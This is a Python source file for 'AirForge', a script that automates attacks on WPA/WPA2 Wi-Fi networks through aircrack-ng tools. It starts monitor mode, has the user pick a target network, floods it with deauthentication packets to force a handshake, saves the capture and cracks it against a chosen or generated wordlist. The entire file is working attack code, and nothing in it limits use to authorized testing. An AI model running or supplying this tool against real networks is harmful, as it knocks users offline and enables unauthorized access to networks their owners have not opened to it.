import os
import subprocess
import pyfiglet
import re
import time
from termcolor import colored
from WordlistGenerator import generate_passwords, save_to_file  

def print_banner():
    os.system("clear" if os.name != 'nt' else "cls")
    print(colored(pyfiglet.figlet_format("AirForge"), "cyan"))
    print(colored("🔥 WPA/WPA2 Handshake Cracker with Custom Wordlist Generator", "yellow"))

def detect_bssid():
    interface = "wlan0" 
    print("[*] Running airmon-ng to start monitor mode...")
    
    result = subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(result.stdout)
    print(result.stderr)
    
    if result.returncode != 0:
        print(colored("[!] Failed to start monitor mode. Exiting.", "red"))
        return None, None
    
    time.sleep(2)
    
    print("[*] Running airodump-ng to scan for networks...")
    print(colored("[*] Press Ctrl+C when you see the desired BSSID and channel to stop the scan.", "yellow"))
    try:
        process = subprocess.Popen(
            ["airodump-ng", f"{interface}mon"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        while True:
            output = process.stdout.readline()
            if output:
                print(output.strip())
    except KeyboardInterrupt:
        print(colored("\n[!] Stopping airodump-ng...", "yellow"))
        process.terminate()
        process.wait()
    except Exception as e:
        print(colored(f"[!] Error running airodump-ng: {e}", "red"))
        return None, None
    
    bssid = input(colored("[?] Enter the BSSID you want to target: ", "blue")).strip()
    channel = input(colored("[?] Enter the corresponding channel: ", "blue")).strip()
    
    if not bssid or not channel:
        print(colored("[!] BSSID and channel are required. Exiting.", "red"))
        return None, None
    
    return bssid, channel

def capture_handshake(bssid, channel, interface):
    print(colored("[*] Starting handshake capture...", "yellow"))
    output_prefix = "/root/Desktop/handshake"

    try:
        print(colored(f"[*] Setting interface {interface} to channel {channel}...", "yellow"))
        result = subprocess.run(["iwconfig", interface, "channel", channel], stderr=subprocess.PIPE, text=True)
        if result.returncode != 0:
            print(colored(f"[!] Failed to set channel: {result.stderr.strip()}", "red"))
            return None

        print(colored("[*] Running airodump-ng to capture packets...", "yellow"))
        print(colored("[*] Press Ctrl+C when you believe the handshake has been captured.", "cyan"))
        process = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "-c", channel, "-w", output_prefix, interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        print(colored("[*] Sending deauthentication packets to force a handshake...", "yellow"))
        deauth_process = subprocess.Popen(
            ["aireplay-ng", "--deauth", "50", "-a", bssid, interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        try:
            while True:
                output = process.stdout.readline()
                if output:
                    print(output.strip())
        except KeyboardInterrupt:
            print(colored("\n[!] Stopping handshake capture...", "yellow"))
    except Exception as e:
        print(colored(f"[!] Error during handshake capture: {e}", "red"))
    finally:
        if process:
            process.terminate()
            process.wait()
        if 'deauth_process' in locals():
            deauth_process.terminate()
            deauth_process.wait()

    cap_files = [f for f in os.listdir("/root/Desktop/") if f.startswith("handshake") and f.endswith(".cap")]
    if cap_files:
        cap_files.sort()
        latest_cap_file = os.path.join("/root/Desktop/", cap_files[-1])
        print(colored(f"[+] Handshake file saved to: {latest_cap_file}", "green"))
        return latest_cap_file
    else:
        print(colored("[!] No handshake file captured.", "red"))
        return None

def extract_bssid_from_cap(cap_file):
    try:
        print(colored("[*] Extracting BSSID from the .cap file...", "yellow"))
        result = subprocess.run(
            ["aircrack-ng", cap_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        output = result.stdout

        # Use regex to extract the BSSID (MAC address format)
        bssid_match = re.search(r"([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5})", output)
        if bssid_match:
            bssid = bssid_match.group(1)
            print(colored(f"[+] Extracted BSSID: {bssid}", "green"))
            return bssid
        else:
            print(colored("[!] Failed to extract BSSID from the .cap file.", "red"))
            return None
    except Exception as e:
        print(colored(f"[!] Error extracting BSSID: {e}", "red"))
        return None

def choose_wordlist():
    print(colored("\n[1] Choose from saved wordlists", "magenta"))
    print(colored("[2] Generate a custom wordlist", "magenta"))
    print(colored("[3] Download an online wordlist", "magenta"))
    choice = input(colored("[?] Choose wordlist option: ", "blue"))

    if choice == '1':
        wordlist_dir = "/usr/share/wordlists/"
        if not os.path.isdir(wordlist_dir):
            print(colored("[!] Wordlist directory not found. Please ensure wordlists are installed.", "red"))
            return None

        # List all available wordlists in the directory
        wordlists = [f for f in os.listdir(wordlist_dir) if os.path.isfile(os.path.join(wordlist_dir, f))]
        if not wordlists:
            print(colored("[!] No wordlists found in the system. Please add wordlists to /usr/share/wordlists/.", "red"))
            return None

        print(colored("\n[*] Available wordlists:", "magenta"))
        for idx, wordlist in enumerate(wordlists, start=1):
            print(colored(f"[{idx}] {wordlist}", "cyan"))

        # Prompt the user to select a wordlist
        try:
            selected_idx = int(input(colored("[?] Choose a wordlist by number: ", "blue")).strip())
            if 1 <= selected_idx <= len(wordlists):
                selected_wordlist = os.path.join(wordlist_dir, wordlists[selected_idx - 1])
                print(colored(f"[+] Selected wordlist: {selected_wordlist}", "green"))
                return selected_wordlist
            else:
                print(colored("[!] Invalid choice. Please select a valid number.", "red"))
                return None
        except ValueError:
            print(colored("[!] Invalid input. Please enter a number.", "red"))
            return None

    elif choice == '2':
        keywords = input(colored("[?] Enter keywords (comma-separated): ", "blue")).strip().split(",")
        keywords = [kw.strip() for kw in keywords if kw.strip()]
        try:
            num = int(input(colored("[?] How many passwords to generate? ", "blue")))
        except ValueError:
            print(colored("[!] Invalid number. Defaulting to 1000.", "red"))
            num = 1000
        wordlist = generate_passwords(keywords, num)
        filename = "custom_wordlist.txt"
        save_to_file(wordlist, filename)
        return filename

    elif choice == '3':
        print(colored("[*] Downloading an online wordlist...", "yellow"))
        wordlist_url = input(colored("[?] Enter the URL of the wordlist: ", "blue")).strip()
        filename = "online_wordlist.txt"
        try:
            subprocess.run(["curl", "-o", filename, wordlist_url], check=True)
            print(colored(f"[+] Wordlist downloaded and saved to {filename}", "green"))
            return filename
        except subprocess.CalledProcessError:
            print(colored("[!] Failed to download the wordlist. Please check the URL.", "red"))
            return None

    else:
        print(colored("[!] Invalid choice. Please select a valid option.", "red"))
        return None

def main():
    print_banner()

    # Ask the user if they want to use an existing .cap file
    use_existing_cap = input(colored("[?] Do you want to use an existing .cap file? (y/n): ", "blue")).strip().lower()
    if use_existing_cap == 'y':
        handshake = input(colored("[?] Enter the full path to the .cap file: ", "blue")).strip()
        if not os.path.isfile(handshake):
            print(colored("[!] Invalid .cap file path. Exiting...", "red"))
            return
        print(colored(f"[+] Using existing .cap file: {handshake}", "green"))

        # Extract the BSSID from the .cap file
        bssid = extract_bssid_from_cap(handshake)
        if not bssid:
            print(colored("[!] Could not extract BSSID. Exiting...", "red"))
            return
    else:
        # Proceed with handshake capture
        bssid, channel = detect_bssid()
        if not bssid or not channel:
            return

        print(colored(f"[*] Targeting BSSID: {bssid} on Channel: {channel}", "cyan"))
        handshake = capture_handshake(bssid, channel, "wlan0mon")
        if not handshake:
            print(colored(f"[!] Failed to capture handshake. Exiting...", "red"))
            return

        print("\n[*] Stopping monitor mode...")
        subprocess.run(["airmon-ng", "stop", "wlan0mon"])

    # Choose a wordlist
    print("\n[*] Choosing a wordlist...")
    wordlist_path = choose_wordlist()
    while not wordlist_path or not os.path.isfile(wordlist_path):
        print(colored(f"[!] Invalid wordlist selection. Please choose again.", "red"))
        wordlist_path = choose_wordlist()

    # Automatically run aircrack-ng with the selected wordlist
    print(colored("\n[*] Starting aircrack-ng to crack the handshake...", "yellow"))
    try:
        subprocess.run(["aircrack-ng", "-w", wordlist_path, "-b", bssid, handshake], check=True)
    except subprocess.CalledProcessError as e:
        print(colored(f"[!] aircrack-ng failed: {e}", "red"))

if __name__ == "__main__":
    main()
